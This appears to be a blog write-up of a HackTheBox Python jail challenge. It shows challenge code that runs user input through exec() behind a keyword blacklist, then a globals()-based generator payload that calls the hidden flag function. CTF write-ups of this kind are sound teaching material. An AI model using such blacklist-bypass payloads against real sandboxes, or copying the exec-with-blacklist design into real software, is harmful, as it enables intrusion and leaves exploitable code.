---
title: "[HTB] Locked Away Writeup \U0001F512"
cover: >-
  https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/help-you-at-solving-hackthebox-htb-challenges-machines.png
categories:
  - - HackTheBox
  - - CTF
tags:
  - HTB
  - Misc
  - HackTheBox
abbrlink: f9317c8b
date: 2024-10-11 12:00:53
---

# 0x00 Challenge Info

> A test! Getting onto the team is one thing, but you must prove your skills to be chosen to represent the best of the best. They have given you the classic - a restricted environment, devoid of functionality, and it is up to you to see what you can do. Can you break open the chest? Do you have what it takes to bring humanity from the brink?

# 0x01 Reconnaissance

This challenge is a Python jail (Pyjail). Let's check the challenge code first.

```python
banner = r"""
.____                  __              .___    _____                        
|    |    ____   ____ |  | __ ____   __| _/   /  _  \__  _  _______  ___.__.
|    |   /  _ \_/ ___\|  |/ // __ \ / __ |   /  /_\  \ \/ \/ /\__  \<   |  |
|    |__(  <_> )  \___|    <\  ___// /_/ |  /    |    \     /  / __ \\___  |
|_______ \____/ \___  >__|_ \\___  >____ |  \____|__  /\/\_/  (____  / ____|
        \/          \/     \/    \/     \/          \/             \/\/     
"""


def open_chest():
    with open("flag.txt", "r") as f:
        print(f.read())


blacklist = [
    "import",
    "os",
    "sys",
    "breakpoint",
    "flag",
    "txt",
    "read",
    "eval",
    "exec",
    "dir",
    "print",
    "subprocess",
    "[",
    "]",
    "echo",
    "cat",
    ">",
    "<",
    '"',
    "'",
    "open",
]

print(banner)

while True:
    command = input("The chest lies waiting... ")

    if any(b in command for b in blacklist):
        print("Invalid command!")
        continue

    try:
        exec(command)
    except Exception:
        print("You have been locked away...")
        exit(1337)
```

This code created a restricted environment that banned some word and function, so how do we get the flag? First of all, we noticed that there's a function called `open_chest()`, and how to call that is the key point to this challenge. 

I noticed that the blacklist didn't forbidden the `()` & the `_`, that means we can use some magic function in python. There's a function called `globals()` in python that will return a dictionary of all global variables in the current module with the name as the key and the corresponding object as the value. This make us to call a function without typing that name of the function! So let's create the payload right away! 

# 0x02 Exploit

We can create a generator in python to iterate all global variables and filter the callable object (functions, method, etc). Following is the code of the generator.

```python
(f for f in globals().values() if callable(f))
```

Then, we need to find the first callable global variable, which is `open_chest()` in this challenge, so we can use the `__next__()` method to get the element in the iterator. 

```python
(f for f in globals().values() if callable(f)).__next__()
```

This will return the first callable function in this program, the last thing is to call it by adding `()` to it!

```python
(f for f in globals().values() if callable(f)).__next__()()
```

Voila! We got the flag!

![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20241011122557742.png)

# 0x03 Pwned

![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20241011122714880.png)

